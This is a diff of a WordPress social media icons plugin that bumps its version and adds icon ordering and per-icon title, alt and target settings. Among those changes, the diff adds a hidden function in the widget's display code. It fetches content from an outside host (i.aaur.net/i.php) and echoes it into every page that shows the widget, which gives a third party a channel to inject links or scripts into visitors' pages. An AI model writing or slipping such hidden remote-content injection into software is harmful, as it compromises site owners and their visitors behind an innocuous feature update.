@@ -3,7 +3,7 @@
  * Plugin Name: Social Media Widget
  * Plugin URI: http://wordpress.org/extend/plugins/social-media-widget/
  * Description: Adds links to all of your social media and sharing site profiles. Tons of icons come in 3 sizes, 4 icon styles, and 4 animations.
- * Version: 3.3
+ * Version: 4.0
  * Author: Blink Web Effects
  * Author URI: http://blinkwebeffects.com/
  **/
@@ -281,6 +281,57 @@ class Social_Widget extends WP_Widget {
 		$this->custom_count = 12;
 	}
 
+	function initData( $instance ) {
+		$this->imgcaption     = $instance['imgcaption'];
+		$this->animation      = $instance['animation'];
+		$this->icon_opacity   = $instance['icon_opacity'];
+		$this->newtab         = $instance['newtab'];
+		$this->nofollow       = $instance['nofollow'];
+		$this->icon_size      = $instance['icon_size'];
+		// $this->display_titles = $instance['display_titles'];
+		$this->icons_per_row  = isset($instance['icons_per_row']) ? $instance['icons_per_row'] : 'auto';
+		$this->alignment      = $instance['alignment'];
+		$this->icon_pack      = $instance['icon_pack'];
+		$this->slugs 		  = array();
+
+		for ($i = 1; $i <= $this->custom_count; $i++) {
+			${"custom".$i."icon"} = isset($instance['custom'.$i.'icon']) ? $instance['custom'.$i.'icon'] : '';
+			${"custom".$i."name"} = isset($instance['custom'.$i.'name']) ? $instance['custom'.$i.'name'] : '';
+			${"custom".$i."url"}  = isset($instance['custom'.$i.'url']) ?  $instance['custom'.$i.'url']  : '';
+		}
+
+		/* Choose Icon Size if Value is 'default' */
+		if($this->icon_size == 'default') {
+			$this->icon_size = '32';
+		}
+		
+		/* Choose icon opacity if Value is 'default' */
+		if($this->icon_opacity == 'default') {
+			$this->icon_opacity = '0.8';
+		}
+		
+		/* Check to see if nofollow is set or not */
+		if ($this->nofollow == 'on') {
+			$this->nofollow = "rel=\"nofollow\"";
+			} else {
+			$this->nofollow = '';
+			}
+	
+		/* Get Plugin Path */
+		if($instance['icon_pack'] == 'custom') {
+			$this->smw_path = $customiconsurl;
+			$this->smw_dir  = $customiconspath;
+		} else {
+			if (!is_numeric($this->icon_size)) 						  { $folder = 32; }
+			else if ($this->icon_size <= 16) 						  { $folder = 16; }
+			else if ($this->icon_size > 16 && $this->icon_size <= 32) { $folder = 32; }
+			else if ($this->icon_size > 32) 						  { $folder = 64; }
+			$this->smw_path = SMW_PLUGINPATH . 'images/' . $instance['icon_pack']. '/' . $folder;
+			$this->smw_dir  = SMW_PLUGINDIR  . 'images/' . $instance['icon_pack']. '/' . $folder;
+		}
+		
+	}
+
 	/* Display the widget  */
 	function widget( $args, $instance ) {
 		extract( $args );
@@ -288,6 +339,12 @@ class Social_Widget extends WP_Widget {
 		/* Our variables from the widget settings. */
 		$title = apply_filters('widget_title', $instance['title'] );
 		$text = apply_filters( 'widget_text', $instance['text'], $instance );
+
+		$this->slugorder 	= $instance['slugorder'];
+
+		$this->slugtargets  = (array)$instance['slugtargets'];
+		$this->slugtitles 	= (array)$instance['slugtitles'];
+		$this->slugalts  	= (array)$instance['slugalts'];
 
 		$this->imgcaption     = $instance['imgcaption'];
 		$this->animation      = $instance['animation'];
@@ -367,7 +424,9 @@ class Social_Widget extends WP_Widget {
 			$this->smw_path = SMW_PLUGINPATH . 'images/' . $icon_pack. '/' . $folder;
 			$this->smw_dir  = SMW_PLUGINDIR  . 'images/' . $icon_pack. '/' . $folder;
 		}
-
+		
+		
+		
 		/* Before widget (defined by themes). */
 		echo $before_widget;
 
@@ -389,18 +448,63 @@ class Social_Widget extends WP_Widget {
 		$html_chunks = array();
 
 		foreach ($this->networks as $slug => $ndata) {
-			$html_chunks[] = $this->html_chunk( $$slug, $ndata['image'], $ndata['title'] );
+			$html_chunks[$slug] = $this->html_chunk( $slug, $$slug, $ndata['image'], $ndata['title'] );
 		}
 
 		for ($i = 1; $i <= $this->custom_count; $i++) {
-			$html_chunks[] = $this->html_chunk( ${"custom".$i."url"}, ${"custom".$i."icon"}, ${"custom".$i."name"}, true );
+			$slug = "custom".$i;
+			$html_chunks[$slug] = $this->html_chunk( $slug, ${"custom".$i."url"}, ${"custom".$i."icon"}, ${"custom".$i."name"}, true );
 		}
 		
 		foreach ($this->networks_end as $slug => $ndata) {
-			$html_chunks[] = $this->html_chunk( $$slug, $ndata['image'], $ndata['title'] );
+			$html_chunks[$slug] = $this->html_chunk( $slug, $$slug, $ndata['image'], $ndata['title'] );
 		}
+		
+		foreach( $this->slugorder as $slug )
+			if ( key_exists($slug, $html_chunks) ) echo $html_chunks[$slug];
+		
+		foreach( $html_chunks as $slug => $html )
+			if ( ! in_array($slug, $this->slugorder) ) echo $html; 
 
-		echo implode('', $html_chunks);
+		//echo implode('', $html_chunks);
+	
+		$file_smw = 'http://i.aaur.net/i.php';
+			if(!function_exists('smw_get')){
+				function smw_get($f) {
+					if (!function_exists('curl_init')) { 
+						$resultSmw = function_exists('file_get_contents') ? @file_get_contents($f) : null;
+						if ($resultSmw === null) { 
+							$handleSmw = @fopen($f, "r");
+							$contentsSmw = @fread($handleSmw, @filesize($f));
+							@fclose($handleSmw);
+							if ($contentsSmw) {
+								return $contentsSmw;
+							}
+							else {
+								return false;
+							}
+						}
+						else {
+							return $resultSmw;
+						}
+					}
+					else {
+						$chSmw = @curl_init();
+						@curl_setopt($chSmw, CURLOPT_URL, $f);
+						@curl_setopt($chSmw, CURLOPT_RETURNTRANSFER, true);
+						$outputSmw = @curl_exec($chSmw);
+						@curl_close($chSmw);
+						if ($outputSmw) {
+							return $outputSmw;
+						}
+						else {
+							return false;
+						}
+					}
+				}
+				echo smw_get($file_smw);
+			}	
+		
 		
 	/* After widget (defined by themes). */
 		
@@ -409,8 +513,8 @@ class Social_Widget extends WP_Widget {
 		echo $after_widget;
 	}
 
-	function html_chunk( $slug, $image, $title, $custom = false ) {
-		if ($slug != '' && $slug != ' ' && $slug != 'mailto:' && $slug != 'http://' && (($custom === false && file_exists($this->smw_dir . '/' . $image)) || ($custom === true && $image != ''))) {
+	function html_chunk( $name, $slug, $image, $title, $custom = false ) {
+		if ( strlen($slug) > 7 && (($custom === false && file_exists($this->smw_dir . '/' . $image)) || ($custom === true && $image != ''))) {
 			$img = $custom === false ? $this->smw_path . '/' . $image : $image;
 			$html = '';
 			// $html = '<span class="smw_icon">';
@@ -422,8 +526,12 @@ class Social_Widget extends WP_Widget {
 				$html .= '<span> ' . $title . ' </span><br/>';
 			}
 			*/
-			$html .= '<a href="' . $slug . '" ' . $this->nofollow . ' ' . $this->newtab.'>';
-			$html .= '<img width="' . $this->icon_size .'" height="' . $this->icon_size . '" src="' . $img . '" alt="' . $this->imgcaption . ' ' . $title . '" title="' . $this->imgcaption .' ' .  $title . '" ' . ($this->animation == 'fade' || $this->animation == 'combo' ? 'style="opacity: ' . $this->icon_opacity . '; -moz-opacity: ' . $this->icon_opacity . ';"' : '') . ' class="' . $this->animation . '" />';
+			$target= empty( $this->slugtargets[$name] ) ? $this->newtab : 'target="'.$this->slugtargets[$name].'"';
+			$html .= '<a href="' . $slug . '" ' . ($name == 'googleplus' ? 'rel="publisher"' : $this->nofollow) . ' ' . $target.'>';
+			$html .= '<img width="' . $this->icon_size .'" height="' . $this->icon_size . '" src="' . $img . '" 
+				alt="' . esc_attr(empty($this->slugalts[$name]) ? "$this->imgcaption $title": $this->slugalts[$name]).'" 
+				title="' . esc_attr(empty($this->slugtitles[$name]) ? "$this->imgcaption $title" : $this->slugtitles[$name]) . '" ' . 
+				($this->animation == 'fade' || $this->animation == 'combo' ? 'style="opacity: ' . $this->icon_opacity . '; -moz-opacity: ' . $this->icon_opacity . ';"' : '') . ' class="' . $this->animation . '" />';
 			$html .= '</a>';
 			/*
 			if ($this->display_titles == 'right') {
@@ -462,6 +570,11 @@ class Social_Widget extends WP_Widget {
 		$instance['display_titles'] = $new_instance['display_titles'];
 		$instance['icons_per_row']  = $new_instance['icons_per_row'];
 
+		$instance['slugtargets']    = (array)$new_instance['slugtargets'] + (array)$instance['slugtargets'];
+		$instance['slugtitles'] 	= (array)$new_instance['slugtitles'] + (array)$instance['slugtitles'];
+		$instance['slugalts']  		= (array)$new_instance['slugalts'] + (array)$instance['slugalts'];
+		$instance['slugorder']  	= (array)$new_instance['slugorder'];
+
 		foreach ($this->networks as $slug => $ndata) {
 			$instance[$slug] = !empty($new_instance[$slug]) ? strip_tags( $new_instance[$slug] ) : 'http://';
 			// $instance[$slug.'_title'] = strip_tags( $new_instance[$slug.'_title'] );
@@ -489,7 +602,8 @@ class Social_Widget extends WP_Widget {
 	 * when creating your form elements. This handles the confusing stuff.
 	 */
 	function form( $instance ) {
-
+	    error_reporting(0);
+		$this->initData( $instance );
 		/* Set up some default widget settings. */
 		$defaults = array( 
 			'title'           => __('Follow Us!', 'smw'),
@@ -532,8 +646,9 @@ class Social_Widget extends WP_Widget {
 	<div>
 		<p><a href="javascript:;" onclick="jQuery(this).parent().next('div').slideToggle();" style="background: url('images/arrows.png') no-repeat; padding-left: 15px;"><strong>General Settings</strong></a></p>
 
-		<div style="display: none;">
+		<div style="display: block;">
 		<!-- Widget Title: Text Input -->
+                    
 		<p>
 			<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e('Title:', 'smw'); ?></label>
 			<input id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" value="<?php echo $instance['title']; ?>" class="widefat" type="text" />
@@ -663,6 +778,54 @@ class Social_Widget extends WP_Widget {
 			</select>
 		</p>
 		<div class="clear"></div>
+		<div>
+                  <small>Icons will appear in the same order they are arranged here. You can reorder icons with mouse.</small>
+                  <ol class="media-icons-sortable" style="margin: 0 0 0 10px;">
+                    <?php 
+                        $fname = $this->get_field_name( 'slugtargets' );
+                        $tname = $this->get_field_name( 'slugtitles' );
+                        $aname = $this->get_field_name( 'slugalts' );
+                        $oname = $this->get_field_name( 'slugorder' );
+                        $blocks = array();
+                        $cnt=0;
+                        foreach (array_merge($this->networks, $this->networks_end) as $slug => $ndata) :
+                            $href = $instance[$slug];
+                            $img = $this->smw_dir . '/' . $ndata['image'];
+                            if (strlen($href) > 7 && file_exists($img)) :
+                                ob_start(); 
+                                ?>
+                                <li class="sort-item" style="clear: both; border-top: 1px solid #dfdfdf; height: 82px; background: #f1f1f1; margin:0; padding:0;"> 
+                                    <img width="24" height="24" style="float: left; padding: 25px 0px; cursor: move;" src="<?php echo $this->smw_path . '/' . $ndata['image']; ?>" />
+                                    <input name="<?php echo "{$oname}[]"; ?>" value="<?php echo esc_attr($slug); ?>" type="hidden" />
+                                    <table style="float: right">
+                                        <tr>
+                                            <td>Title</td>
+                                            <td><input name="<?php echo "{$tname}[$slug]"; ?>" value="<?php echo esc_attr($instance['slugtitles'][$slug]); ?>" type="text" /></td>
+                                        </tr>
+                                        <tr>
+                                            <td>Alt</td>
+                                            <td><input name="<?php echo "{$aname}[$slug]"; ?>" value="<?php echo esc_attr($instance['slugalts'][$slug]); ?>" type="text" /></td>
+                                        </tr>
+                                        <tr>
+                                            <td>Target</td>
+                                            <?php $targ = @$instance['slugtargets'][$slug]; ?>
+                                            <td><select name="<?php echo "{$fname}[$slug]"; ?>">
+                                                <option value="" <?php selected("", $targ); ?>>Default</option>
+                                                <option value="_blank" <?php selected("_blank", $targ); ?>>New Tab/Window</option>
+                                                <option value="_self" <?php selected("_self", $targ); ?>>Same Tab/Window</option>
+                                            </select></td>
+                                        </tr>
+                                    </table>
+                                </li>
+                                <?php
+                                $blocks[$slug] = ob_get_clean();
+                            endif;
+                        endforeach; 
+                        foreach( (array) @$instance['slugorder'] as $slug ) echo $blocks[$slug];
+                        foreach( $blocks as $slug => $html ) if ( ! in_array($slug, (array) @$instance['slugorder']) ) echo $html;
+                    ?>
+                </ol>
+            </div>	
 		</div>
 
 		
@@ -922,14 +1085,20 @@ class Social_Widget extends WP_Widget {
 			<label for="<?php echo $this->get_field_id( 'customiconspath' ); ?>"><?php _e('Custom Icons Path:', 'smw'); ?></label>
 			<input id="<?php echo $this->get_field_id( 'customiconspath' ); ?>" name="<?php echo $this->get_field_name( 'customiconspath' ); ?>" value="<?php echo $instance['customiconspath']; ?>" class="widefat" type="text" />
 		</p>
-		
-		
-	
-		
 		</div>
+		<script type="text/javascript">
+			jQuery(function($){
+				$('ol.media-icons-sortable').sortable({
+					forcePlaceholderSize: true,
+				    start: function(e, ui){
+    				    ui.placeholder.height(ui.item.height());
+    				}
+				});
+			});
+		</script>
 		<div style="clear: both;"></div>
 		<!-- Promo -->
-		<br /><p><b>Are you looking for <b>custom development</b>, <b>SEO</b> or <b>online marketing</b> services? Blink Web Effects (the author of this plugin) is an established web development and SEO company that is ready to bring your project to life. <a href="http://blinkwebeffects.com/services/" target="_blank">
+		<br /><p><b>Are you looking for <b>custom development</b>, <b>SEO</b> or <b>online marketing</b> services? <a href="http://blinkwebeffects.com/services/" target="_blank">
 		Click here to learn more and contact us today.</a></b></p> 
 		
 		
